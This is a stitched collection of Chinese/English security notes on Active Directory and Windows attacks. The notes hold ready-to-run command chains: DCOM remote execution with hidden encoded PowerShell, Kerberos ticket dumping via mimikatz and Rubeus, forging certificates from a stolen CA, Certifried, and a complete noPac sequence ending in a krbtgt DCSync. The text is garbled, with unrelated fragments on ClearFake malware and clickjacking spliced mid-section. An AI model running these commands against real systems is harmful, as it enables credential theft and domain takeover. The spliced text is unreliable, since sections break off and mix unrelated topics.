content: 来源路径： 02-知识点/域与Windows/DCOM Exec 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DCOM Exec 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 DCOM Exec 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 DCOM Exec 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：DCOM Exec、Prerequisites & Gotchas、MMC20.Application、ShellWindows & ShellBrowserWindow、ShellWindows；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 DCOM Exec Prerequisites & Gotchas MMC20.Application ShellWindows & ShellBrowserWindow ShellWindows ShellBrowserWindow 横向移动 with Excel DCOM Objects Automation 工具 for 横向移动 Automatic 工具 SCM 工具 # 核心要点 DCOM 横向移动 is attractive because it reuses existing COM servers exposed over RPC/DCOM instead of creating a service or scheduled task. In practice this means the initial connection usually starts on TCP/135 and then moves to dynamically assigned high RPC ports. Manual or scripted DCOM execution generally needs TCP/135 plus the target's dynamic RPC port range. If you are using Impacket's dcomexec.py and you want command output back, you usually also need SMB access to ADMIN$ (or another writable/readable share). If RPC/DCOM works but SMB is blocked, dcomexec.py -nooutput can still be useful for blind execution. For more info about this technique chech the original post from https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ The COM object, MMC Application Class (MMC20.Application), enables scripting of MMC snap-in operations. Notably, this object contains a ExecuteShellCommand method under Document.ActiveView. More information about this method can be found here.aspx>). Check it running: This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows: For more info about this technique check the original post https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ Ability to write a 载荷 to a writable directory in the target's PATH Invoke-DCOM.ps1: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository. SharpLateral: A tool designed for executing code remotely, which can be used with the command: The Powershell script Invoke-DCOM.ps1 allows to easily invoke all the commented ways to execute code in other machines. You can use Impacket's dcomexec.py to execute commands on remote systems using DCOM. Current builds support ShellWindows, ShellBrowserWindow, and MMC20, and default to ShellWindows. You could also use SharpLateral: SCMExec is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service that runs the command. This method can 绕过 some security controls, such as User Account Control (UAC) and Windows Defender. SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\ 载荷.exe" servicename=WindowsDebug amsi=true # 命令 / 载荷 / 操作片段 # 1. Prerequisites & Gotchas 12345# Enumerate registered DCOM applicationsGet-CimInstance Win32_DCOMApplication | Select-Object AppID, Name# Useful to inspect firewall/RPC issuesTest-NetConnection -ComputerName 10.10.10.10 -Port 135 # 2. MMC20.Application 1Get-CimInstance Win32_DCOMApplication # 3. MMC20.Application 1[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>")) # 4. MMC20.Application 12$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))$com.Document.ActiveView | Get-Member # 5. MMC20.Application 1234567$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))$com.Document.ActiveView.ExecuteShellCommand( "cmd.exe", $null, "/c powershell -NoP -W Hidden -Enc <B64>", "7") # 6. ShellWindows 12345# Example$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")$obj = [System.Activator]::CreateInstance($com)$item = $obj.Item()$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0) # 7. content: 来源路径： 02-知识点/域与Windows/DACL abuse 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # DACL abuse 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 DACL abuse 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 DACL abuse 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：DACL abuse、Theory、Practice、侦察、Abuse；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 DACL abuse Theory Practice 侦察 Abuse BloodHound 图分析 ACE edges Permisssions index Talk 🎤 # 核心要点 When misconfigured, ACEs can be abused to operate 横向移动 or 权限提升 within an AD domain. Other 工具 like, Get-DomainObjectAcl and Add-DomainObjectAcl from Powersploit's Powerview, Get-Acl and Set-Acl official Powershell cmdlets, or Impacket's dacledit.py script (Python) can be used in order to manually inspect an object's DACL. All the aforementioned attacks (red blocks) are detailed in the child notes, except: SPN-jacking: very specific scenario, requires lots of access: see ADDS > Movement > Kerberos > SPN-jacking Shadow 凭据: see ADDS > Movement > Kerberos > Shadow 凭据 Kerberos RBCD: see ADDS > Movement > Kerberos > Kerberos Delegations > RBCD DCSync : see ADDS > Movement > Credential > Dumping > DCSync AddKeyCredentialLink, a write permission on an object's Key-Credential-Link attribute, for Shadow 凭据 attacks WriteSPN, a write permission on an object's Service-Principal-Name attribute, for targeted Kerberoasting 服务票据离线爆破 and SPN jacking attacks AddSelf, similar to AddMember. While AddMember is WriteProperty access right on the target's Member attribute, AddSelf is a Self access right on the target's Member attribute, allowing the attacker to add itself to the target group, instead of adding arbitrary principals. AddAllowedToAct, a write permission on an object's msDS-Allowed-To-Act-On-Behalf-Of-Other-Identity attribute, for Kerberos RBCD attacks SyncLAPSPassword, both DS-GetChanges and DS-GetChangesInFilteredSet, for synchronizing LAPS 密码 domain-wise WriteAccountRestrictions, which refers to the User-Account-Restrictions property set, which contains enough permissions to modify the msDS-Allowed-To-Act-On-Behalf-Of-Other-Identity attribute of the target objects, for Kerberos RBCD attacks # 工具与参考入口 BloodHound 图分析.py SharpHound Powersploit Powerview Impacket PR#1291 Synacktiv explained OUned.py DCSync http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm https://adsecurity.org/?p=3658 https://blog.cptjesus.com/posts/bloodhound20/ https://posts.specterops.io/introducing-BloodHound 图分析 - 3-0-c00e77ff0aa6 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Pwn 基础链路 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Content-Type juggling 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Content-Type juggling 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Content-Type juggling 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Content-Type juggling 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Content-Type juggling、Theory、Practice、Identify a target vulnerable to Content-Type juggling、Example attacks；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Content-Type juggling Theory Practice Identify a target vulnerable to Content-Type juggling Example attacks # 核心要点 Content-Type juggling exploits the lack of checking on the Content-Type header when submitting an HTTP request. Most of the time, Content-Type juggling is a way to carry out other attacks such as unrestricted-file - 上传 or XXE-injection (see examples). In responses, a Content-Type header tells the client what type of content is actually being returned. Browsers may try to detect the MIME type of content by inspecting it rather than by respecting the value of this header. In order to identify if the target is vulnerable to Content-Type juggling, testers need to answer the following questions : If the answer is yes to the questions above, then one should be able to perform Content-Type juggling and might find a way to perform other attacks as a result: If one can switch to application/zip, uploading malicious zip file should be tried. If one can switch to application/php, uploading PHP 载荷 should be tried. If one can switch to application/image, uploading malicious image should be tried. # 命令 / 载荷 / 操作片段 # 1. Identify a target vulnerable to Content-Type juggling 1234567891011121314application/java-archiveapplication/EDI-X12application/EDIFACTapplication/javascriptapplication/octet-streamapplication/oggapplication/pdfapplication/xhtml+xmlapplication/x-shockwave-flashapplication/jsonapplication/ld+jsonapplication/xmlapplication/zipapplication/x-www-form-urlencoded # 2. Identify a target vulnerable to Content-Type juggling 12345678image/gifimage/jpegimage/pngimage/tiffimage/vnd.microsoft.iconimage/x-iconimage/vnd.djvuimage/svg+xml # 4. Identify a target vulnerable to Content-Type juggling 1234multipart/mixedmultipart/alternativemultipart/related (using by MHTML (HTML mail).)multipart/form-data # 5. Identify a target vulnerable to Content-Type juggling 123456text/csstext/csvtext/htmltext/javascript (obsolete)text/plaintext/xml # 6. Identify a target vulnerable to Content-Type juggling 1234567video/mpegvideo/mp4video/quicktimevideo/x-ms-wmvvideo/x-msvideovideo/x-flvvideo/webm # 7. Identify a target vulnerable to Content-Type juggling 123456789101112application/vnd.android.package-archiveapplication/vnd.oasis.opendocument.textapplication/vnd.oasis.opendocument.spreadsheetapplication/vnd.oasis.opendocument.presentationapplication/vnd.oasis.opendocument.graphicsapplication/vnd.ms-excelapplication/vnd.openxmlformats-officedocument.spreadsheetml.sheetapplication/vnd.ms-powerpointapplication/vnd.openxmlformats-officedocument.presentationml.presentationapplication/mswordapplication/vnd.openxmlformats-officedocument.wordprocessingml.documentapplication/vnd.mozilla.xul+xml # 8. Injected ClearFake JavaScript calls an unsecuredCopyToClipboard() helper that silently stores a Base64-encoded PowerShell one-liner in the clipboard. powershell.exe executes, downloading an archive that contains a legitimate executable plus a malicious DLL (classic DLL sideloading). The loader decrypts additional stages, injects shellcode and installs 持久化 (e.g. scheduled task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer. Downloads la.txt with curl.exe Executes the JScript downloader inside cscript.exe Process tree: explorer.exe → powershell.exe -c → wscript.exe <temp>\a.js (or cscript.exe). Repeated powershell -NoProfile -NonInteractive -Command：with large stdin 载荷 to feed long scripts without long command lines. Scheduled Tasks that subsequently execute LOLBins such as regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates<name>.dll" under an updater‑looking task/path (e.g., \GoogleSystem\GoogleUpdater). Correlate clipboard write events followed by Win+R paste then immediate powershell.exe execution. Security Event ID 4688 (Process Creation) where ParentImage == explorer.exe and NewProcessName in { powershell.exe, wscript.exe, mshta.exe, curl.exe, cmd.exe }. EDR clipboard sensors (if present) – correlate Clipboard Write followed immediately by a new PowerShell process. OS 检测 via navigator.userAgent to tailor 载荷 (Windows PowerShell/CMD vs. macOS Terminal). Optional decoys/no-ops for unsupported OS to maintain the illusion. Optional obfuscation and single-file injector to overwrite a compromised site’s DOM with a Tailwind-styled verification UI (no new domain registration required). # 命令 / 载荷 / 操作片段 # 1. (left) vulnerable | not vulnerable (right) UI Redressing is a Clickjacking technique where an attacker overlays a transparent UI element on top of a legitimate website or application. the attacker can trick the user into interacting with the hidden content, believing they are interacting with the visible interface. Overlaying Transparent Element: The attacker creates a transparent HTML element (usually a <div>) that covers the entire visible area of a legitimate website. This element is made transparent using CSS properties like opacity: 0;. Misleading User Interaction: The attacker places deceptive elements within the transparent 容器，such as fake buttons, links, or forms. These elements perform actions when clicked, but the user is unaware of their presence due to the overlaying transparent UI element. Invisible Frames is a Clickjacking technique where attackers use hidden iframes to trick users into interacting with content from another website unknowingly. The content inside these invisible frames can be malicious, such as phishing forms, malware downloads, or any other harmful actions. Hidden IFrame Creation: The attacker includes an <iframe> element in a webpage, setting its dimensions to zero and removing its border, making it invisible to the user. Loading Malicious Content: The src attribute of the iframe points to a malicious website or resource controlled by the attacker. This content is loaded silently without the user's knowledge because the iframe is invisible. Visible Interface: The attacker presents a visible button or form to the user, encouraging them to click or interact with it. Invisible Overlay: The attacker overlays this visible button or form with an invisible or transparent element that contains a malicious action, such as submitting a hidden form. Creating Hidden Form: The attacker creates a hidden form containing malicious input fields, targeting a vulnerable action on the victim's website. This form remains invisible to the user. Overlaying Visible Element: The attacker overlays a visible element (button or form) on their malicious page, encouraging users to interact with it. When the user clicks the visible element, they unknowingly trigger the hidden form's submission. Since these type of client side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking. The attacker can use this attack by registering an unload event on the top page using the following example code: Sometimes is possible to fill the value of fields of a form using GET parameters when loading a page. An attacker may abuse this behaviour to fill a form with arbitrary data and send the clickjacking 载荷 so the user press the button Submit. If you have identified an XSS attack that requires a user to click on some element to trigger the XSS and the page is vulnerable to clickjacking, you could abuse it to trick the user into clicking the button/link.\ You found a self XSS in some private details of the account (details that only you can set and read). The page with the form to set these details is vulnerable to Clickjacking and you can prepopulate the form with the GET parameters.\ An attacker could prepare a Clickjacking attack to that page prepopulating the form with the XSS 载荷 and tricking the user into Submit the form. So, when the form is submitted and the values are modified, the user will execute the XSS. This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions. If a framable endpoint renders secrets (tokens, reset codes, API keys), the attacker can distort them so they resemble a CAPTCHA and coerce manual transcription: # 命令 / 载荷 / 操作片段 # 1. As in regular-domain-user-to-domain-admin vulnerable. In their research papers, Will Schroeder and Lee Christensen found multiple vectors of domain escalation based on certificate template misconfigurations (dubbed ESC1, ESC2 and ESC3). Following this, Olivier Lyak has found two new template misconfigurations (dubbed ESC9 and ESC10). Understanding certificate mapping is essential to understand ESC9, ESC10 and ESC14. Mapping can be implicit or explicit, and strong or weak. These two notions work together, and the mapping of a certificate will use one option of each part (implicit and strong, or explicit and strong, and so on). The matches that can be added to the attribute are strings that follow a syntax defined with the identifiers of a certificate: The StrongCertificateBindingEnforcement registry key is used for Kerberos mapping The CertificateMappingMethods registry key is used for Schannel implicit mapping DNS mapping does not block explicit mapping: you can use a certificate with dNSName in the SAN for implicit DNS mapping, but explicit mapping against users and computers works too the full DN cannot be used in the X509SubjectOnly and X509IssuerSubject mappings: the distinguishedName cannot be used in the X509SubjectOnly and X509IssuerSubject mappings, so the certificate template cannot have the SUBJECT REQUIRE DIRECTORY PATH flag for these mappings 0x0008: S4USelf implicit Kerberos mapping 0x0010: S4USelf explicit Kerberos mapping StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag (0x4) GenericWrite right against any account A to compromise any account B # 命令 / 载荷 / 操作片段 # 1. (ESC1) Template allows SAN 12345# Find vulnerable/abusable certificate templates using default low-privileged groupCertify.exe find /vulnerable# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:Certify.exe find /vulnerable /currentuser # 3. (ESC1) Template allows SAN 1Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin" # 4. Forging certificates with a stolen CA certificates (DPERSIST1) Trusting rogue CA certificates (DPERSIST2) The Enterprise CA has a certificate and associated private key that exist on the CA server itself. (Certified Pre-Owned.pdf) Then, forging (and signing) a certificate can be done as follows. The certificate can then be used with Pass the Certificate. In their research papers, Will Schroeder and Lee Christensen found a domain escalation vector based on a dangerous CA setting (i.e. the EDITF ATTRIBUTESUBJECTALTNAME2 flag). The escalation vector was dubbed ESC6. If the CA is configured with the EDITF ATTRIBUTESUBJECTALTNAME2 flag (admins tend to enable that flag without knowing the security implications), and the User template is enabled (which is very often), any user can escalate to domain admin. May 2022 security updates broke the ESC6 attack. As described by Hans-Joachim Knobloch in his article ESC12 – Shell access to AD CS 证书服务 CA with YubiHSM, administrators may configure the Certificate Authority to store its private key on an external device like "Yubico YubiHSM2", over storing it in the software storage. In order to generate and use keys in the YubiHSM, the Key Storage Provider must use an 认证 key (sometimes dubbed "密码"). This key / 密码 is stored in the registry under HKEY LOCAL MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword in cleartext. From UNIX-like systems, Certipy (Python) can be used to enumerate info about the CAs, including the "User Specified SAN" flag state which is an alias to the EDITF ATTRIBUTESUBJECTALTNAME2 flag. # 命令 / 载荷 / 操作片段 # 1. Stolen CA 1certipy ca -backup -ca "CA" -username "USER@domain.local" -password "PASSWORD" -dc-ip "DC-IP" # 2. Stolen CA 1certipy forge -ca-pfx "CA.pfx" -upn "administrator@corp.local" -subject "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL" # 3. Stolen CA 1Seatbelt.exe Certificates -computername="ca.domain.local" # 4. Stolen CA 1Win+R > certsrv.msc > CA > right click > All Tasks > Back up CA... > selet "Private key and CA certificate" > Next # 5. Stolen CA 1mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export" # 6. Stolen CA 1SharpDPAPI.exe certificates /machine # 7. Stolen CA 12openssl pkcs12 -in "ca.pem" -keyex -CSP "Microsoft EnhancedCryptographic Provider v1.0" -export -out "ca.pfx" # 8. Stolen CA 1ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password" # 9. Rogue CA 1certutil.exe -dspublish -f "C:\Temp\CERT.crt" NTAuthCA # 10. (ESC6) EDITF ATTRIBUTESUBJECTALTNAME2 1certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep "User Specified SAN" # 11. content: 来源路径： 02-知识点/域与Windows/Cached Kerberos tickets 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Cached Kerberos tickets 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Cached Kerberos tickets 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Cached Kerberos tickets 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Cached Kerberos tickets、Theory、Storage Methods、Practice、From UNIX-like systems；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Cached Kerberos tickets Theory Storage Methods Practice From UNIX-like systems From Windows Dumping from LSASS Memory Dumping from LSA APIs # 核心要点 Kerberos tickets can be cached on systems to allow for faster 认证 without requiring users to re-enter 凭据. On Linux and other UNIX-like systems, tickets can be stored in different ways: The storage method is configured via the default ccache name parameter in /etc/krb5.conf, which is readable by all users. On Windows systems, Kerberos tickets are stored in-memory within the Local Security Authority Subsystem Service (LSASS). LSASS maintains an internal set of Kerberos logon sessions, each associated with a Logon Session ID (LUID). These structures contain all credential material required by the Kerberos package, including: Ticket Granting Ticket (TGT) Ticket Granting Service (TGS) Tickets are never stored on disk by the operating system. Accessing or manipulating them requires interacting with LSASS memory and the Kerberos 认证 package (via standard LSA functions such as LsaCallAuthenticationPackage). This allows tickets to be enumerated, extracted as serialized blobs, or injected into existing logon sessions for later use. Extracting tickets directly from an LSASS memory dump, and Querying tickets through LSA APIs, which does not require reading raw LSASS memory. Is more OPSEC-friendly (no suspicious LSASS read handle) # 命令 / 载荷 / 操作片段 # 1. From UNIX-like systems 12345# Get persistent keyring addresskeyctl get_persistent @u# Show keyring contentkeyctl show 30711432 # 2. From UNIX-like systems 123456789Keyring 30711432 ---lswrv 0 65534 keyring: _persistent.0 127492740 --alswrv 0 0 \_ keyring: _krb 556713767 --alswrv 0 0 \_ user: krb_ccache:primary1002684101 --alswrv 0 0 \_ keyring: 0 110355059 --alswrv 0 0 \_ user: __krb5_princ__ 575224320 --als-rv 0 0 \_ big_key: krb5_ccache_conf_data/pa_type/krbtgt\/LAB.LOCAL\@LAB.LOCAL@X-CACHECONF: 161110247 --als-rv 0 0 \_ big_key: krbtgt/LAB.LOCAL@LAB.LOCAL 760223933 --alswrv 0 0 \_ user: __krb5_time_offsets__ # 3. From UNIX-like systems 12345678910111213141516# Get principal valuekeyctl print $PRINCIPALS_ADDRESS# Get service keykeyctl print $KEY_ADDRESSThe result will be an hexadecimal string, that can be appended to the ticket header to reconstruct the full ticket.# Reconstruct ticketHEADER='0504000c00010008ffffffff00000000'PRINCIPALS=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')KEY=$(keyctl print $KEY_ADDRESS | awk -F : '{print $3}')ticket=$HEADER$PRINCIPALS$KEY# Save to fileecho "$ticket" | xxd -r -p > ticket.ccache # 4. From UNIX-like systems 1234567891011# List all ticketsfor uid in $(awk '{print$1}' /proc/key-users | tr -d :); do res=$(KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1) if [ $? -eq 0 ]; then echo -e "\n=== UID $uid ===" echo "$res" fidone# Use a specific ticketKRB5CCNAME=KEYRING:persistent:$UID # 5. From UNIX-like systems 12# Extract all tickets from LDB databasepython3 ccacheExtractor.py kcm ./secrets.ldb # 6. Dumping from LSASS Memory 12345# Load a previously obtained lsass.dmp filesekurlsa::minidump lsass.dmp# Extract Kerberos tickets from the dumpsekurlsa::tickets # 7. Dumping from LSA APIs 12345678# Detailed logon session and ticket infoRubeus.exe klist# Extract detailed logon session and ticket dataRubeus.exe dump# Monitor logon events and dump new ticketsRubeus.exe monitor /interval:30 # 工具与参考入口 CCacheExtractor keyringCCacheDumper SSSDKCMExtractor KrbNixPwn mimikatz Rubeus # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The Certificate Authority will use the dNSHostName value for identification and issue a certificate for the Domain Controller. A patch was released in may 2022 to address this 漏洞: more information here and on #certificate-mapping. Requesting a certificate based on the Machine (or User) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (objectSid), then the patch has been applied. If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted. Oliver underlined the fact that to fully mitigate the 漏洞，both the KDC and the CA server must be patched. # 命令 / 载荷 / 操作片段 # 1. Detecting unpatched targets 1certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User' # 2. dNSHostName and servicePrincipalName modification 12345678# Clearing the SPNsbloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname# Setting the dNSHostName value to the name of a computer account to impersonatebloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'# Verifying the dNSHostName value and SPN entriesbloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname # 3. dNSHostName and servicePrincipalName modification 12# Adding a computer account and setting the dNSHostName to impersonatecertipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN" # 4. dNSHostName and servicePrincipalName modification 12345678# Clearing the SPNsSet-ADComputer $COMPUTER_NAME -ServicePrincipalName @{}# Setting the dNSHostName value to the name of a computer account to impersonateSet-ADComputer $COMPUTER_NAME -DnsHostName $DC_NAME.$DOMAIN_FQDN# Verifying the dNSHostName value and SPN entriesGet-ADComputer $COMPUTER_NAME -properties dnshostname,serviceprincipalname # 5. Obtaining a certificate 1certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine' # 6. Obtaining a certificate 1Certify.exe request /ca:"domain\ca" /template:"Machine" # 工具与参考入口 Certifried (CVE-2022-26923) Oliver Lyak more information here Certipy underlined bloodyAD Certipy Active Directory 域 RSAT Certify Pass-the-Certificate https://msrc.microsoft.com/update-guide/ 漏洞 / CVE-2022-26923 https://tryhackme.com/room/cve202226923 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 AD CS 证书攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Computer accounts should have a trailing $ in their name (i.e. sAMAccountName attribute) but no validation process existed to make sure of it. Abused in combination with CVE-2021-42287, it allowed attackers to impersonate domain controller accounts. The attack can then be conducted as follows. Request a service ticket with S4U2self by presenting the TGT obtained before -> CVE-2021-42287 At the time of writing this recipe, some of the 工具 and features that allow 利用 of these vulnerabilities are still in development noPac.py (Python) is an automated alternative that can be used to scan and abuse unpatched targets from a UNIX-like environnment. PowerMad's (PowerShell) New-MachineAccount and Set-MachineAccountAttribute functions for the creation and manipulation of a computer account with Rubeus (C#) for the requests of Kerberos TGT and Service Ticket # 命令 / 载荷 / 操作片段 # 1. Machine Account 1234567891011121314151617181920# 0. create a computer accountaddcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'# 1. clear its SPNsaddspn.py --clear -t 'ControlledComputer$' -u 'domain\user' -p 'password' 'DomainController.domain.local'# 2. rename the computer (computer -> DC)renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'# 3. obtain a TGTgetTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'# 4. reset the computer namerenameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'# 5. obtain a service ticket with S4U2self by presenting the previous TGTKRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'# 6. DCSync by presenting the service ticketKRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local' # 2. Machine Account 12scanner.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IPnoPac.py $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP --impersonate Administrator -dump # 3. Machine Account 123456789101112131415161718192021# 0. create a computer account$password = [REDACTED_SECRET] 'ComputerPassword' -AsPlainText -ForceNew-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose# 1. clear its SPNsSet-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose# 2. rename the computer (computer -> DC)Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose# 3. obtain a TGTRubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap# 4. reset the computer nameSet-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose# 5. obtain a service ticket with S4U2self by presenting the previous TGTRubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]# 6. DCSync(mimikatz) lsadump::dcsync

